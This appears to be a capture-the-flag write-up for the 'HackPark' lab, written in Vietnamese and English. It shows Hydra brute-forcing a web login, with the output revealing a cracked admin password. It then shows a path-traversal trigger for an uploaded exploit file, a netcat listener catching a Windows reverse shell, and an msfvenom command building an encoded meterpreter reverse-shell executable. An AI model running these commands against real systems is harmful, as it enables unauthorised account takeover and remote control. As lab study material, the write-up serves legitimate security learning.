<img width="1307" height="787" alt="image" src="https://github.com/user-attachments/assets/a6e40a7e-6a0c-43ac-86eb-470e0cee9c9e" />

<img width="1468" height="772" alt="image" src="https://github.com/user-attachments/assets/ea09f4b4-5466-4642-9184-61d0d23762f7" />

<img width="1423" height="782" alt="image" src="https://github.com/user-attachments/assets/b18f2926-7aad-4ad6-9e83-20b481de3fa6" />

<img width="930" height="416" alt="image" src="https://github.com/user-attachments/assets/55dd7c18-669c-46e1-bd9d-714d7b5d59d4" />

<img width="482" height="646" alt="image" src="https://github.com/user-attachments/assets/b9dc3cff-49d3-4ead-a8d3-5810acca33e2" />

Cu phap

`hydra -P <wordlist> -v <ip> <protocol>` 	<br>
`hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>` 	<br>
`hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>`<br>
`hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`

```
┌──(kali㉿kali)-[~]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.128.138.181 http-post-form "/Account/login.aspx:__VIEWSTATE=L6PhnOAYOX10Wv1GQ2lfq69aWRkCPC3PPBCdUyo8fXsLR9hKV4vetGeEXDoEMNGJJ3DXGBVYFKzKdEteQTbYGa2Lkwx5LgEbjpbnbuHXjGg%2BBrudqreMSwEF6d40JF%2Fjp8gbJ%2Fh2g29TXPCLNSzKhnixiBEjhwFUgwcm49pvPAT%2FfniguX&__EVENTVALIDATION=IsqZUVbBR05VkpVW0l8rIHJMSyJey2dLuxzAe8kRPA0zY9%2BBqMUlkseWwohgeCEePlls%2BBaIjk8pfNhFohPN5yJeLXX%2Bbq3s7%2FBIGc0Pnlw6kbWI33ohdhbJq7EySUSe992T%2BBmop0QQ5DaPgIxFDh5wDIVOribEQ1xYZUjn%2F2F06X%2FfxSdlyKn&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -f
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-16 10:40:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.128.138.181:80/Account/login.aspx:__VIEWSTATE=L6PhnOAYOX10Wv1GQ2lfq69aWRkCPC3PPBCdUyo8fXsLR9hKV4vetGeEXDoEMNGJJ3DXGBVYFKzKdEteQTbYGa2Lkwx5LgEbjpbnbuHXjGg%2BBrudqreMSwEF6d40JF%2Fjp8gbJ%2Fh2g29TXPCLNSzKhnixiBEjhwFUgwcm49pvPAT%2FfniguX&__EVENTVALIDATION=IsqZUVbBR05VkpVW0l8rIHJMSyJey2dLuxzAe8kRPA0zY9%2BBqMUlkseWwohgeCEePlls%2BBaIjk8pfNhFohPN5yJeLXX%2Bbq3s7%2FBIGc0Pnlw6kbWI33ohdhbJq7EySUSe992T%2BBmop0QQ5DaPgIxFDh5wDIVOribEQ1xYZUjn%2F2F06X%2FfxSdlyKn&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[80][http-post-form] host: 10.128.138.181   login: admin   password: 1qaz2wsx
[STATUS] attack finished for 10.128.138.181 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-16 10:41:01
```
<img width="637" height="773" alt="image" src="https://github.com/user-attachments/assets/4a179d0b-ea2d-4eca-b87d-0b3881809438" />

<img width="796" height="495" alt="image" src="https://github.com/user-attachments/assets/d017e6b9-6ebe-4ccc-b22d-3ac92077b46c" />

Change IP_ATTACKER in `exploit.cs` file

<img width="942" height="457" alt="image" src="https://github.com/user-attachments/assets/8c2db326-1cfa-4644-b4f4-ec408d03e4b9" />

Click vao `Published posts` 

<img width="1905" height="617" alt="Screenshot 2026-07-17 105716" src="https://github.com/user-attachments/assets/593ce61c-1d5d-418f-8360-da010244414c" />

Click vào `Welcome to HackPark` để tải tệp `PostView.ascx` lên

<img width="842" height="193" alt="Screenshot 2026-07-17 105816" src="https://github.com/user-attachments/assets/2a32bc37-53af-4653-a990-3a21f2b428ff" />

<img width="575" height="371" alt="Screenshot 2026-07-17 110331" src="https://github.com/user-attachments/assets/2677c067-efce-42b1-a313-78dc65a917b6" />

Gõ `nc`

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -vnlp 4445     
listening on [any] 4445 ...
```

Thêm `?theme=../../App_Data/files` vào URL để kích hoạt

<img width="587" height="96" alt="Screenshot 2026-07-17 110443" src="https://github.com/user-attachments/assets/b6908455-4194-4e02-8daa-da26be5753fc" />

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -vnlp 4445     
listening on [any] 4445 ...
connect to [192.168.170.150] from (UNKNOWN) [10.112.140.135] 49289
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.8 LPORT=4444 -e x86/shikata_ga_nai -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: reverse.exe
```
